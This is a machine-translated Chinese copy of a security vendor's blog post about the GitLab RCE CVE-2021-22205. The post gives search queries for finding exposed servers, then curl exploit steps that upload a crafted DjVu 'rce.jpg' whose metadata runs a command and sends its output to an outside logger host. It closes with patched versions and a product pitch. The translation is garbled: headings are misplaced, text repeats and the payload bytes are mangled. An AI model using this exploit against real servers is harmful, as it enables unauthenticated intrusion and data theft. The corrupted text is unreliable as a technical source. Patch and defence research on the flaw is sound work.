<html>
<head>
<title>Detect and exploit Gitlab CE/EE RCE with Pentest-Tools.com (CVE-2021-22205) | Pentest-Tools.com</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1>与Pentest-Tools.com一起探测和开发git lab CE/EE RCE(CVE-2021-22205)| Pentest-Tools.com</h1>
<blockquote>原文：<a href="https://pentest-tools.com/blog/detect-and-exploit-gitlab-ce-ee-rce-with-pentest-tools-com-cve-2021-22205#2022-10-06T14:10:03.000Z">https://pentest-tools.com/blog/detect-and-exploit-gitlab-ce-ee-rce-with-pentest-tools-com-cve-2021-22205#2022-10-06T14:10:03.000Z</a></blockquote><div><div class="prose prose-headings:break-words prose-img:rounded-md prose-img:ring-1 prose-img:ring-dark-blue-200 prose-img:ring-opacity-30 prose-code:break-words prose-headings:[scroll-margin-top:120px] xl:prose-lg xl:prose-headings:w-[628px] xl:prose-p:w-[628px]">
            
              
                
                  <p>“打补丁就好！”这是当漏洞来袭时的通常建议(而且不是零日)。但是，对于必须管理一层又一层基础架构的组织来说，事情从来都没有那么简单。</p><p>当你不得不处理一个像git lab(<a target="_blank" href="https://nvd.nist.gov/vuln/detail/CVE-2021-22205" rel="external nofollow noopener noreferrer">cvss v3</a><a target="_blank" href="https://nvd.nist.gov/vuln/detail/CVE-2021-22205" rel="external nofollow noopener noreferrer"><strong>10)最新未认证的RCE这样的批判性CVE时。</strong> </a> 0)，将气泡修补到表面的纠结、杂乱的过程。</p><p>2021年4月7日，<a target="_blank" href="https://hackerone.com/vakzz" rel="external nofollow noopener noreferrer"> vakkz </a>在<a target="_blank" href="https://hackerone.com/" rel="external nofollow noopener noreferrer"> Hackerone </a>上提交了一份<a target="_blank" href="https://hackerone.com/reports/1154542" rel="external nofollow noopener noreferrer">报告</a>，称他发现了一个当用户上传畸形图片到Gitlab时远程执行代码的漏洞。在这种情况下，Gitlab将图像发送到Exiftool，根据预定义的白名单标签过滤恶意内容。</p><p><em>那么，是什么让它成为如此大的问题呢</em>？是时候多讲一点背景知识了。</p><h2 id="what-is-gitlab"><strong>git lab是什么？</strong></h2><p>GitLab是一个基于web的DevOps生命周期工具，它为Git存储库管理器提供了wiki、问题跟踪以及持续集成和部署管道等功能，该工具使用GitLab Inc .开发的开源许可证。</p><p><a target="_blank" href="https://about.gitlab.com/company" rel="external nofollow noopener noreferrer"> Gitlab自诩</a>“预计注册用户3000万，活跃许可用户100多万”，贡献者超过2500人。“从这些数字中可以明显看出，Gitlab中的一个关键安全问题可能会产生广泛的影响。</p><p> </p><p><img src="../Images/e45e4ca51602e4a8d0d638b1dd3fa3cf.png" alt="Gitlab interface" loading="lazy" data-original-src="https://pentest-tools.com/blog/img/asset/YXNzZXRzL2NvbnRlbnQvZGV0ZWN0LWdpdGxhYi1jdmUtMjAyMS0yMjIwNS91bnRpdGxlZC02LnBuZw==?s=13a3bcf73cfe2b624843ba87b8a183fc"/></p><p>该平台遵循开放核心开发模型，其中基本功能在开源(MIT)许可证下发布，而代码所有者、多问题受托人、依赖性扫描和洞察力等附加功能在专有许可证下推出。</p><h2 id="how-the-gitlab-ceee-rce-vuln-works"><strong>git lab CE/EE RCE vuln如何工作</strong></h2><p>当用户上传带有任何<strong> jpeg/jpg/tiff </strong>扩展名的图片时，Gitlab的主力将它发送到<a target="_blank" href="https://exiftool.org/" rel="external nofollow noopener noreferrer"> Exiftool </a>以根据预定义的白名单标签过滤恶意内容。Exiftool尝试根据提供的内容确定文件类型的有效性。因此，如果用户重命名文件，可以加载任何解析器，而不仅仅是上面提到的扩展名。</p><p>由于不正确的验证，如果具有对端口443的网络访问权限的恶意参与者传递带有包含恶意元数据的<a target="_blank" href="https://github.com/exiftool/exiftool/blob/11.70/lib/Image/ExifTool/DjVu.pm" rel="external nofollow noopener noreferrer"> DjVu </a>注释的图像，他们可以在服务器上以<em> git </em>用户的身份执行任意命令。</p><p>这是一个<a target="_blank" href="/blog/?s=Out-of-Band+vulnerability"> <strong>带外漏洞</strong> </a>，意味着命令的输出没有反映在响应中。攻击者必须使用外部记录器来捕捉响应。</p><p>毫不奇怪，自2021年6月以来，这个漏洞在互联网上被广泛利用。</p><h2 id="vulnerable-gitlab-versions"><strong>易受攻击的Gitlab版本</strong></h2><p>根据他们的<a target="_blank" href="https://about.gitlab.com/releases/2021/04/14/security-release-gitlab-13-10-3-released/" rel="external nofollow noopener noreferrer">安全发布</a>，这个安全问题被追踪为<a target="_blank" href="https://nvd.nist.gov/vuln/detail/CVE-2021-22205" rel="external nofollow noopener noreferrer"> CVE-2021-22205 </a>，影响从11.9开始直到13.10.2、13.9.5和13.8.7的Gitlab CE版本。当它出来时，它的CVSSv3评分为9.9，但他们最近将其升级到10.0，因为它是一个<a href="/blog/?s=unauthenticated+vulnerability"> <strong>未经认证的漏洞</strong> </a>。</p><p>自2021年4月以来，补丁已经可用，但很可能仍有大量易受攻击的实例。由于运行Gitlab的公司数量庞大(超过100，000家)，该漏洞是一个必须修补的补丁。</p><h2 id="business-impact-of-cve-2021-22205"><strong>CVE的业务影响-2021-22205 </strong></h2><p>成功利用此漏洞后，未经验证的攻击者可以获得远程代码执行俱乐部的“完全访问票”。</p><p>那么，你如何证明对CVE的商业影响呢？</p><p>我将展示三种方法来查找可能受此漏洞影响的实例。</p><h3 id="using-shodan"><strong>使用Shodan </strong></h3><p>在写这篇文章的时候，Shodan透露了至少有<strong> 55，366个潜在易受攻击的</strong>服务器。</p><p><img src="../Images/15b362e20dab6f354847ce6e67c41edd.png" alt="vulnerable servers in Shodan" loading="lazy" data-original-src="https://pentest-tools.com/blog/img/asset/YXNzZXRzL2NvbnRlbnQvZGV0ZWN0LWdpdGxhYi1jdmUtMjAyMS0yMjIwNS91bnRpdGxlZC03LnBuZw==?s=f7ad4512f584ea9cc1774a11c0c81d51"/>您可以使用以下Shodan查询来查找暴露于此未经验证的RCE漏洞的Gitlab设备:</p><p><strong> <em>标题:【签到git lab】</em></strong></p><p><strong>使用谷歌呆子</strong></p><h3 id="using-google-dorks">Gitlab实例使用基于web的接口，因此您可以使用Google Dorks通过以下搜索查询来找出Gitlab主机:</h3><p><em> intitle:“登录git lab”</em></p><p><em> intitle:“登录git lab”</em></p><p><img src="../Images/8a0f61682c82beadd75b595a27cf9d87.png" alt="Google Dorks page result" loading="lazy" data-original-src="https://pentest-tools.com/blog/img/asset/YXNzZXRzL2NvbnRlbnQvZGV0ZWN0LWdpdGxhYi1jdmUtMjAyMS0yMjIwNS91bnRpdGxlZC04LnBuZw==?s=fbf16af2c21258d806f4b0555ebb70e1"/></p><p><strong>使用PublicWWW </strong></p><h3 id="using-publicwww"><a target="_blank" href="https://publicwww.com/" rel="external nofollow noopener noreferrer"> PublicWWW </a>是一个搜索引擎，您可以使用它根据源代码内容、响应标题、cookies和使用的技术来搜索网站。您可以使用我刚才提到的相同的呆子，也可以使用一些更多的细节，如:</h3><p><em>“登录git lab”</em></p><p><em>“登录git lab”</em></p><p><img src="../Images/85beb71265436c0aa28cba97267cdb9d.png" alt="search results in Publicwww" loading="lazy" data-original-src="https://pentest-tools.com/blog/img/asset/YXNzZXRzL2NvbnRlbnQvZGV0ZWN0LWdpdGxhYi1jdmUtMjAyMS0yMjIwNS91bnRpdGxlZC05LnBuZw==?s=03a4426d506017ade2604a6571aca782"/></p><p><strong>如何在道德黑客活动中利用CVE-2021-22205</strong></p><h2 id="how-to-exploit-cve-2021-22205-in-ethical-hacking-engagements">为了利用CVE-2021-22205 ，你必须遵循以下步骤:</h2><p>curl-k-s https://<strong>&lt;HOST&gt;</strong>/users/sign _ in<br/>从这里，您需要提取cookie会话id和CSRF令牌。&gt;</p><div class="flex flex-col"><div class="-mx-4 -my-2 overflow-x-auto sm:-mx-6"><div class="inline-block min-w-full py-2 align-middle sm:px-6"><div class="border border-gray-200 bg-white overflow-hidden shadow sm:rounded-lg"><table class="min-w-full divide-y divide-gray-200"><thead><tr><td colspan="1" rowspan="1">curl-I-s-k-X $ ' POST '<br/>-H $ ' Host:<strong>&lt;Host&gt;</strong>'-H $ ' Connection:close '-H $ ' Accept-Encoding:gzip，deflate '-H $ ' Accept:<em>/</em>'-H $ ' User-Agent:Mozilla/5.0(Windows NT 10.0；RV:60.0)Gecko/2011 01 01 Firefox/60.0 '-H $ ' X-Csrf-Token:<strong>&lt;CSRF _ Token&gt;</strong>'-H $ ' Content-Type:multipart/form-data；boundary =—-webkitformboundaryimv 3 mxrg 59 tkfsx 5 '-H $ ' Content-Length:974 '<br/>-b $ '<em>GITLAB</em>SESSION =<strong>&lt;GITLAB _ SESSION&gt;</strong>；实验<em> subject </em> id= &lt; <strong>实验<em>SUBJECT</em>ID</strong>&gt;<br/>–data-binary $ ' x0dx0a——webkitformboundaryimv 3 mxrg 59 tkfsx 0x 0 dx0a content-Disposition:form-data；name = " filefilename = "<strong>rce.jpg</strong>" x0dx 0 a content-Type:image/JPEG x0 dx 0 ax 0x 0 aat&amp;t formx 0 0x 00x 0x 03 xafdjvmdirmx 00x 00 x 00 x 81 x 00 x 02 x 00 x 00 FX 00x 00 x 00 acxfffxfxfxdebfx 99！xc8x 91 nxebx 0 CX 07 x1 fxd 2 xda x88 xe 8 kxe 6 dx 0 f，qx02xeeIxd3nx95xbdxa2xc3 "？formx00x00x00^djvuinfox00x00x00x0ax00x08x00x08x18x00dx00x16x00inclx00x00x00x0fshared_anno.iffx00bg44x00x00x00x11x00jx01x02x00x08x00x08x8axe6xe1xb17xd9x7f*x89x00bg44x00x00x00x04x01x0fxf9x9fbg44x00x00x00x02x02x0aformx00x00x03x07djviantax00x00x01p(metadatax0ax09(copyright " \ x0a "。qx {<strong>curl–data $(&lt;命令&gt;)https://&lt;LOGGER&gt;</strong>}。\ x0a " b "))x 0x 0 dx 0 a——webkitformboundaryimv 3m xrg 59 tkfsx 5–x 0x 0 ax 0 dx 0 a " '<br/>' https://<strong>&lt;HOST&gt;</strong>/uploads/user '</td></tr></thead><tr><td colspan="1" rowspan="1">curl-I-s-k-X $ ' POST '<br/>-H $ ' Host:<strong>&lt;Host&gt;</strong>'-H $ ' Connection:close '-H $ ' Accept-Encoding:gzip，deflate '-H $ ' Accept:<em>/</em>'-H $ ' User-Agent:Mozilla/5.0(Windows NT 10.0；RV:60.0)Gecko/2011 01 01 Firefox/60.0 '-H $ ' X-Csrf-Token:<strong>&lt;CSRF _ Token&gt;</strong>'-H $ '内容-类型:multipart/form-data；boundary =—-webkitformboundaryimv 3 mxrg 59 tkfsx 5 '-H $ ' Content-Length:974 '<br/>-b $ '<em>GITLAB</em>SESSION =<strong>&lt;GITLAB _ SESSION&gt;</strong>；实验<em> subject </em> id= &lt; <strong>实验<em>SUBJECT</em>ID</strong>&gt;<br/>–data-binary $ ' x0dx0a——webkitformboundaryimv 3 mxrg 59 tkfsx 0x 0 dx0a content-Disposition:form-data；name = " filefilename = "<strong>rce.jpg</strong>" x0dx 0 a content-Type:image/JPEG x0 dx 0 ax 0x 0 aat&amp;t formx 0 0x 00x 0x 03 xafdjvmdirmx 00x 00 x 00 x 81 x 00 x 02 x 00 x 00 FX 00x 00 x 00 acxfffxfxfxdebfx 99！xc8x 91 nxebx 0 CX 07 x1 fxd 2 xda x88 xe 8 kxe 6 dx 0 f，qx02xeeIxd3nx95xbdxa2xc3 "？formx00x00x00^djvuinfox00x00x00x0ax00x08x00x08x18x00dx00x16x00inclx00x00x00x0fshared_anno.iffx00bg44x00x00x00x11x00jx01x02x00x08x00x08x8axe6xe1xb17xd9x7f*x89x00bg44x00x00x00x04x01x0fxf9x9fbg44x00x00x00x02x02x0aformx00x00x03x07djviantax00x00x01p(metadatax0ax09(copyright " \ x0a "。qx {<strong>curl–data $(&lt;COMMAND&gt;)https://&lt;LOGGER&gt;</strong>}。\ x0a " b "))x 0x 0 dx 0 a——webkitformboundaryimv 3m xrg 59 tkfsx 5–x 0x 0 ax 0 dx 0 a " '<br/>' https://<strong>&lt;HOST&gt;</strong>/uploads/user '</td></tr></table></div></div></div></div><p>如果你想尝试另一种更快的开发策略，请继续阅读这篇文章。</p><p>验证CVE-2021-22205在你的目标上可被利用的最快和最省事的方法是使用<a href="https://pentest-tools.com/exploit-helpers/sniper">狙击自动利用者</a>，Pentest-Tools.com上的自动攻击者。</p><p>该工具自动模拟现实世界的利用和攻击技术:</p><p>它扫描开放的端口，收集有关协议、服务类型和版本的数据</p><ul><li><p>它对web服务进行指纹识别，以确定运行的web应用程序的类型及其背后的技术栈</p></li><li><p>它寻找兼容的利用</p></li><li><p>它检查目标是否确实易受攻击，在此阶段不提取任何数据</p></li><li><p>一旦获得RCE，Sniper自动提取所有工件(当前和本地用户，系统信息，运行进程，网络配置等。)，这将在输出报告中得到</p></li><li><p>它确实会清除，所以目标保持不变。</p></li><li><p><img src="../Images/b882ea14ac60e05e0645f9d7df4d4196.png" alt="Sniper scan results" loading="lazy" data-original-src="https://pentest-tools.com/blog/img/asset/YXNzZXRzL2NvbnRlbnQvZGV0ZWN0LWdpdGxhYi1jdmUtMjAyMS0yMjIwNS9zbmlwZXItZXhwbG9pdGVyLXRvb2wtb3V0cHV0LnBuZw==?s=905974c6c036139d8d159476e8b46bfa"/></p></li></ul><p><img src="../Images/741d41cecf7dee84bc5ef2b772dc1063.png" alt="Sniper console output" loading="lazy" data-original-src="https://pentest-tools.com/blog/img/asset/YXNzZXRzL2NvbnRlbnQvZGV0ZWN0LWdpdGxhYi1jdmUtMjAyMS0yMjIwNS9zbmlwZXItY29uc29sZS1vdXRwdXQucG5n?s=03edd61e720178d18d71b88621ac53a4"/></p><p><em>这一切都发生在<strong>一分钟</strong></em>——字面意思——与人工开采相比，这是一个巨大的收获，特别是当你在pentest中时间紧迫的时候(而当<em>没有发生</em>？).</p><p>由于Sniper不会生成结果，如果您想在结果页面中填充漏洞，请运行默认包含Sniper检测模块的<a target="_blank" href="https://pentest-tools.com/network-vulnerability-scanning/network-security-scanner-online-openvas">网络漏洞扫描</a>。</p><p><img src="../Images/be0f164d5173ba1bb365f38495b1c4c4.png" alt="Gitlab RCE detection with Sniper" loading="lazy" data-original-src="https://pentest-tools.com/blog/img/asset/YXNzZXRzL2NvbnRlbnQvZGV0ZWN0LWdpdGxhYi1jdmUtMjAyMS0yMjIwNS9naXRsYWItcmNlLWRldGVjdGlvbi5wbmc=?s=582e90373206a916fd3ec8e7a4473d5a"/></p><p><strong>如何缓解CVE-2021-22205 </strong></p><p>我们建议在您的环境中应用可用的补丁，因为Gitlab已经发布了<a target="_blank" href="https://about.gitlab.com/releases/2021/04/14/security-release-gitlab-13-10-3-released/" rel="external nofollow noopener noreferrer">针对CVE-2021-22205 </a>的补丁。</p><h2 id="how-to-mitigate-cve-2021-22205">产品构建</h2><p>固定版本</p><div class="flex flex-col"><div class="-mx-4 -my-2 overflow-x-auto sm:-mx-6"><div class="inline-block min-w-full py-2 align-middle sm:px-6"><div class="border border-gray-200 bg-white overflow-hidden shadow sm:rounded-lg"><table class="min-w-full divide-y divide-gray-200"><thead><tr><td colspan="1" rowspan="1">Gitlab 13.10</td><td colspan="1" rowspan="1">13.10.3</td></tr></thead><tr><td colspan="1" rowspan="1">Gitlab 13.9</td><td colspan="1" rowspan="1">13.9.6</td></tr><tr><td colspan="1" rowspan="1">Gitlab 13.8</td><td colspan="1" rowspan="1">13.8.8</td></tr><tr><td colspan="1" rowspan="1"><strong> DevOps很棒——如果你持续关注它的话</strong></td><td colspan="1" rowspan="1">全球企业正在运行Gitlab技术，以更轻松地管理他们的代码结构，并扩展他们的DevOps生命周期。虽然这种基于web的解决方案有助于组织提高软件生产效率，但未打补丁的实例可能会给他们带来一系列安全问题。</td></tr></table></div></div></div></div><h2 id="devops-is-great-if-you-constantly-keep-an-eye-on-it">定期监控是确保业务连续性的必备条件，而<a target="_blank" href="https://pentest-tools.com/features/scan-scheduling">计划扫描</a>(你也可以在<a target="_blank" href="https://pentest-tools.com">Pentest-Tools.com</a>上获得)是一种在潜在问题升级之前发现它们的简单方法。</h2><p>我们的团队一直在努力添加新功能并改进【Pentest-Tools.com】上的<a href="https://pentest-tools.com">工具</a>(现在是25+)和<a href="https://pentest-tools.com/features">功能</a>，这样你就可以快速检测和利用漏洞，甚至更快地报告它们。</p><p>定期监控是确保业务连续性的必备条件，而<a target="_blank" href="https://pentest-tools.com/features/scan-scheduling">计划扫描</a>(你也可以在【Pentest-Tools.com】T2上获得)是一种在潜在问题升级之前发现它们的简单方法。</p><p>我们的团队一直在努力添加新功能，并改进【Pentest-Tools.com】上的<a href="https://pentest-tools.com">工具</a>(目前为25+)和<a href="https://pentest-tools.com/features">功能</a>，以便您可以快速检测和利用漏洞，甚至更快地报告它们。</p>

                

                
              
            
          </div>
        </div>    
</body>
</html>